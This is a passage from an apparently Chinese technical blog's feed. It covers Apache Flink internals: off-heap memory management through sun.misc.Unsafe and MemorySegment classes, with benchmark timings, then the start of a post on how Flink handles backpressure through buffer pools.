&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sun.misc.Unsafe.getLong(Object reference, &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; offset)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;如果reference不为空，则会取该对象的地址，加上后面的offset，从相对地址处取出8字节并得到 long。这对应了堆内存的场景。&lt;/li&gt;
&lt;li&gt;如果reference为空，则offset就是要操作的绝对地址，从该地址处取出数据。这对应了堆外内存的场景。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里我们看下 &lt;code&gt;MemorySegment&lt;/code&gt; 及其子类的实现。&lt;/p&gt;
&lt;figure class=&quot;highlight axapta&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MemorySegment&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 堆内存引用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] heapMemory;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 堆外内存地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; address;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//堆内存的初始化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  MemorySegment(&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] buffer, Object owner) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//一些先验检查&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.heapMemory = buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.address = BYTE_ARRAY_BASE_OFFSET;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//堆外内存的初始化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  MemorySegment(&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; offHeapAddress, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; size, Object owner) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//一些先验检查&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.heapMemory = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.address = offHeapAddress;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; getLong(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;index&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; pos = address + &lt;span class=&quot;keyword&quot;&gt;index&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;index&lt;/span&gt; &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; pos &amp;lt;= addressLimit - &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 这是我们关注的地方，使用 Unsafe 来操作 on-heap &amp;amp; off-heap&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; UNSAFE.getLong(heapMemory, pos);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (address &amp;gt; addressLimit) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; IllegalStateException(&lt;span class=&quot;string&quot;&gt;&quot;segment has been freed&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// index is in fact invalid&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; IndexOutOfBoundsException();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;HeapMemorySegment&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MemorySegment&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 指向heapMemory的额外引用，用来如数组越界的检查&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] memory;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 只能初始化堆内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  HeapMemorySegment(&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] memory, Object owner) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;super&lt;/span&gt;(Objects.requireNonNull(memory), owner);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.memory = memory;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;HybridMemorySegment&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MemorySegment&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; ByteBuffer offHeapBuffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 堆外内存初始化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  HybridMemorySegment(ByteBuffer buffer, Object owner) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;super&lt;/span&gt;(checkBufferAndGetAddress(buffer), buffer.capacity(), owner);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.offHeapBuffer = buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 堆内存初始化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  HybridMemorySegment(&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] buffer, Object owner) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;super&lt;/span&gt;(buffer, owner);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.offHeapBuffer = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以发现，HybridMemorySegment 中的很多方法其实都下沉到了父类去实现。包括堆内堆外内存的初始化。&lt;code&gt;MemorySegment&lt;/code&gt; 中的 &lt;code&gt;getXXX&lt;/code&gt;/&lt;code&gt;putXXX&lt;/code&gt; 方法都是调用了 unsafe 方法，可以说&lt;code&gt;MemorySegment&lt;/code&gt;已经具有了些 Hybrid 的意思了。&lt;code&gt;HeapMemorySegment&lt;/code&gt;只调用了父类的&lt;code&gt;MemorySegment(byte[] buffer, Object owner)&lt;/code&gt;方法，也就只能申请堆内存。另外，阅读代码你会发现，许多方法（大量的 getXXX/putXXX）都被标记成了 final，两个子类也是 final 类型，为的也是优化 JIT 编译器，会提醒 JIT 这个方法是可以被去虚化和内联的。&lt;/p&gt;
&lt;p&gt;对于堆外内存，使用 &lt;code&gt;HybridMemorySegment&lt;/code&gt; 能同时用来代表堆和堆外内存。这样只需要一个类就能代表长生命周期的堆外内存和短生命周期的堆内存。既然&lt;code&gt;HybridMemorySegment&lt;/code&gt;已经这么全能，为什么还要方案1呢？因为我们需要工厂模式来保证只有一个子类被加载（为了更高的性能），而且HeapMemorySegment比heap模式的HybridMemorySegment要快。&lt;/p&gt;
&lt;p&gt;下方是一些性能测试数据，更详细的数据请参考&lt;a href=&quot;http://flink.apache.org/news/2015/09/16/off-heap-memory.html#appendix-detailed-micro-benchmarks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Segment&lt;/th&gt;
&lt;th&gt;Time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;HeapMemorySegment, exclusive&lt;/td&gt;
&lt;td&gt;1,441 msecs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HeapMemorySegment, mixed&lt;/td&gt;
&lt;td&gt;3,841 msecs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HybridMemorySegment, heap, exclusive&lt;/td&gt;
&lt;td&gt;1,626 msecs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HybridMemorySegment, off-heap, exclusive&lt;/td&gt;
&lt;td&gt;1,628 msecs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HybridMemorySegment, heap, mixed&lt;/td&gt;
&lt;td&gt;3,848 msecs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HybridMemorySegment, off-heap, mixed&lt;/td&gt;
&lt;td&gt;3,847 msecs&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本文主要总结了 Flink 面对 JVM 存在的问题，而在内存管理的道路上越走越深。从自己管理内存，到序列化框架，再到堆外内存。其实纵观大数据生态圈，其实会发现各个开源项目都有同样的趋势。比如最近炒的很火热的 Spark Tungsten 项目，与 Flink 在内存管理上的思想是及其相似的。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://flink.apache.org/news/2015/09/16/off-heap-memory.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Off-heap Memory in Apache Flink and the curious JIT compiler
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://flink.apache.org/news/2015/05/11/Juggling-with-Bits-and-Bytes.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Juggling with Bits and Bytes
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://flink.apache.org/news/2015/03/13/peeking-into-Apache-Flinks-Engine-Room.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Peeking into Apache Flink’s Engine Room
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cwiki.apache.org/confluence/pages/viewpage.action?pageId=53741525&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Flink: Memory Management &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.bigsynapse.com/addressing-big-data-performance&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Big Data Performance Engineering
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://mishadoff.com/blog/java-magic-part-4-sun-dot-misc-dot-unsafe/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;sun.misc.misc.Unsafe usage for C style memory management&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://howtodoinjava.com/core-java/related-concepts/usage-of-class-sun-misc-unsafe/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;sun.misc.misc.Unsafe usage for C style memory management - How to do it.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.javamex.com/tutorials/memory/object_memory_usage.shtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Memory usage of Java objects: general guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.36dsj.com/archives/33650&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;脱离JVM？ Hadoop生态圈的挣扎与演化&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;如今，大数据领域的开源框架（Hadoop，Spark，Storm）都使用的 JVM，当然也包括 Flink。基于 JVM 的数据分析引擎都需要面对将大量数据存到内存中，这就不得不面对 JVM 存在的几个问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Java 对象存储密度低。一个只包含 boolean 属性的对象占用了16个字节内存：对象头占了8个，boolean 属性占了1个，对齐填充占了7个。而实际上只需要一个bit（1/8字节）就够了。&lt;/li&gt;
&lt;li&gt;Full GC 会极大地影响性能，尤其是为了处理更大数据而开了很大内存空间的JVM来说，GC 会达到秒级甚至分钟级。&lt;/li&gt;
&lt;li&gt;OOM 问题影响稳定性。OutOfMemoryError是分布式计算框架经常会遇到的问题，当JVM中所有对象大小超过分配给JVM的内存大小时，就会发生OutOfMemoryError错误，导致JVM崩溃，分布式框架的健壮性和性能都会受到影响。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以目前，越来越多的大数据项目开始自己管理JVM内存了，像 Spark、Flink、HBase，为的就是获得像 C 一样的性能以及避免 OOM 的发生。本文将会讨论 Flink 是如何解决上面的问题的，主要内容包括内存管理、定制的序列化工具、缓存友好的数据结构和算法、堆外内存、JIT编译优化等。&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
      <category term="内存管理" scheme="http://wuchong.me/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：如何处理反压问题</title>
    <link href="http://wuchong.me/blog/2016/04/26/flink-internals-how-to-handle-backpressure/"/>
    <id>http://wuchong.me/blog/2016/04/26/flink-internals-how-to-handle-backpressure/</id>
    <published>2016-04-26T11:18:26.000Z</published>
    <updated>2016-05-03T15:47:52.000Z</updated>
    
    <content type="html">&lt;p&gt;流处理系统需要能优雅地处理反压（backpressure）问题。反压通常产生于这样的场景：短时负载高峰导致系统接收数据的速率远高于它处理数据的速率。许多日常问题都会导致反压，例如，垃圾回收停顿可能会导致流入的数据快速堆积，或者遇到大促或秒杀活动导致流量陡增。反压如果不能得到正确的处理，可能会导致资源耗尽甚至系统崩溃。&lt;/p&gt;
&lt;p&gt;目前主流的流处理系统 Storm/JStorm/Spark Streaming/Flink 都已经提供了反压机制，不过其实现各不相同。&lt;/p&gt;
&lt;p&gt;Storm 是通过监控 Bolt 中的接收队列负载情况，如果超过高水位值就会将反压信息写到 Zookeeper ，Zookeeper 上的 watch 会通知该拓扑的所有 Worker 都进入反压状态，最后 Spout 停止发送 tuple。具体实现可以看这个 JIRA &lt;a href=&quot;https://github.com/apache/storm/pull/700&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;STORM-886&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;JStorm 认为直接停止 Spout 的发送太过暴力，存在大量问题。当下游出现阻塞时，上游停止发送，下游消除阻塞后，上游又开闸放水，过了一会儿，下游又阻塞，上游又限流，如此反复，整个数据流会一直处在一个颠簸状态。所以 JStorm 是通过逐级降速来进行反压的，效果会较 Storm 更为稳定，但算法也更复杂。另外 JStorm 没有引入 Zookeeper 而是通过 TopologyMaster 来协调拓扑进入反压状态，这降低了 Zookeeper 的负载。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Flink-中的反压&quot;&gt;&lt;a href=&quot;#Flink-中的反压&quot; class=&quot;headerlink&quot; title=&quot;Flink 中的反压&quot;&gt;&lt;/a&gt;Flink 中的反压&lt;/h2&gt;&lt;p&gt;那么 Flink 是怎么处理反压的呢？答案非常简单：Flink 没有使用任何复杂的机制来解决反压问题，因为根本不需要那样的方案！它利用自身作为纯数据流引擎的优势来优雅地响应反压问题。下面我们会深入分析 Flink 是如何在 Task 之间传输数据的，以及数据流如何实现自然降速的。&lt;/p&gt;
&lt;p&gt;Flink 在运行时主要由 &lt;strong&gt;operators&lt;/strong&gt; 和 &lt;strong&gt;streams&lt;/strong&gt; 两大组件构成。每个 operator 会消费中间态的流，并在流上进行转换，然后生成新的流。对于 Flink 的网络机制一种形象的类比是，Flink 使用了高效有界的分布式阻塞队列，就像 Java 通用的阻塞队列（BlockingQueue）一样。还记得经典的线程间通信案例：生产者消费者模型吗？使用 BlockingQueue 的话，一个较慢的接受者会降低发送者的发送速率，因为一旦队列满了（有界队列）发送者会被阻塞。Flink 解决反压的方案就是这种感觉。&lt;/p&gt;
&lt;p&gt;在 Flink 中，这些分布式阻塞队列就是这些逻辑流，而队列容量是通过缓冲池（&lt;code&gt;LocalBufferPool&lt;/code&gt;）来实现的。每个被生产和被消费的流都会被分配一个缓冲池。缓冲池管理着一组缓冲(&lt;code&gt;Buffer&lt;/code&gt;)，缓冲在被消费后可以被回收循环利用。这很好理解：你从池子中拿走一个缓冲，填上数据，在数据消费完之后，又把缓冲还给池子，之后你可以再次使用它。&lt;/p&gt;
&lt;p&gt;在解释 Flink 的反压原理之前，我们必须先对 Flink 中网络传输的内存管理有个了解。&lt;/p&gt;
&lt;h3 id=&quot;网络传输中的内存管理&quot;&gt;&lt;a href=&quot;#网络传输中的内存管理&quot; class=&quot;headerlink&quot; title=&quot;网络传输中的内存管理&quot;&gt;&lt;/a&gt;网络传输中的内存管理&lt;/h3&gt;&lt;p&gt;如下图所示展示了 Flink 在网络传输场景下的内存管理。网络上传输的数据会写到 Task 的 InputGate（IG） 中，经过 Task 的处理后，再由 Task 写到 ResultPartition（RS） 中。每个 Task 都包括了输入和输入，输入和输出的数据存在 &lt;code&gt;Buffer&lt;/code&gt; 中（都是字节数据）。Buffer 是 MemorySegment 的包装类。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB14fLsHVXXXXXWXFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;TaskManager（TM）在启动时，会先初始化&lt;code&gt;NetworkEnvironment&lt;/code&gt;对象，TM 中所有与网络相关的东西都由该类来管理（如 Netty 连接），其中就包括&lt;code&gt;NetworkBufferPool&lt;/code&gt;。根据配置，Flink 会在 NetworkBufferPool 中生成一定数量（默认2048）的内存块 MemorySegment（关于 Flink 的内存管理，&lt;a href=&quot;http://wuchong.me/blog/2016/04/29/flink-internals-memory-manage/&quot;&gt;后续文章&lt;/a&gt;会详细谈到），内存块的总数量就代表了网络传输中所有可用的内存。NetworkEnvironment 和 NetworkBufferPool 是 Task 之间共享的，每个 TM 只会实例化一个。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Task 线程启动时，会向 NetworkEnvironment 注册，NetworkEnvironment 会为 Task 的 InputGate（IG）和 ResultPartition（RP） 分别创建一个 LocalBufferPool（缓冲池）并设置可申请的 MemorySegment（内存块）数量。IG 对应的缓冲池初始的内存块数量与 IG 中 InputChannel 数量一致，RP 对应的缓冲池初始的内存块数量与 RP 中的 ResultSubpartition 数量一致。不过，每当创建或销毁缓冲池时，NetworkBufferPool 会计算剩余空闲的内存块数量，并平均分配给已创建的缓冲池。注意，这个过程只是指定了缓冲池所能使用的内存块数量，并没有真正分配内存块，只有当需要时才分配。为什么要动态地为缓冲池扩容呢？因为内存越多，意味着系统可以更轻松地应对瞬时压力（如GC），不会频繁地进入反压状态，所以我们要利用起那部分闲置的内存块。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在 Task 线程执行过程中，当 Netty 接收端收到数据时，为了将 Netty 中的数据拷贝到 Task 中，InputChannel（实际是 RemoteInputChannel）会向其对应的缓冲池申请内存块（上图中的①）。如果缓冲池中也没有可用的内存块且已申请的数量还没到池子上限，则会向 NetworkBufferPool 申请内存块（上图中的②）并交给 InputChannel 填上数据（上图中的③和④）。如果缓冲池已申请的数量达到上限了呢？或者 NetworkBufferPool 也没有可用内存块了呢？这时候，Task 的 Netty Channel 会暂停读取，上游的发送端会立即响应停止发送，拓扑会进入反压状态。当 Task 线程写数据到 ResultPartition 时，也会向缓冲池请求内存块，如果没有可用内存块时，会阻塞在请求内存块的地方，达到暂停写入的目的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;当一个内存块被消费完成之后（在输入端是指内存块中的字节被反序列化成对象了，在输出端是指内存块中的字节写入到 Netty Channel 了），会调用 &lt;code&gt;Buffer.recycle()&lt;/code&gt; 方法，会将内存块还给 LocalBufferPool （上图中的⑤）。如果LocalBufferPool中当前申请的数量超过了池子容量（由于上文提到的动态容量，由于新注册的 Task 导致该池子容量变小），则LocalBufferPool会将该内存块回收给 NetworkBufferPool（上图中的⑥）。如果没超过池子容量，则会继续留在池子中，减少反复申请的开销。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;反压的过程&quot;&gt;&lt;a href=&quot;#反压的过程&quot; class=&quot;headerlink&quot; title=&quot;反压的过程&quot;&gt;&lt;/a&gt;反压的过程&lt;/h3&gt;&lt;p&gt;下面这张图简单展示了两个 Task 之间的数据传输以及 Flink 如何感知到反压的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1rCIvJpXXXXcKXXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;记录“A”进入了 Flink 并且被 Task 1 处理。（这里省略了 Netty 接收、反序列化等过程）&lt;/li&gt;
&lt;li&gt;记录被序列化到 buffer 中。&lt;/li&gt;
&lt;li&gt;该 buffer 被发送到 Task 2，然后 Task 2 从这个 buffer 中读出记录。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;不要忘了：记录能被 Flink 处理的前提是，必须有空闲可用的 Buffer。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;结合上面两张图看：Task 1 在输出端有一个相关联的 LocalBufferPool（称缓冲池1），Task 2 在输入端也有一个相关联的 LocalBufferPool（称缓冲池2）。如果缓冲池1中有空闲可用的 buffer 来序列化记录 “A”，我们就序列化并发送该 buffer。&lt;/p&gt;
&lt;p&gt;这里我们需要注意两个场景：&lt;/p&gt;
&lt;ul&gt;
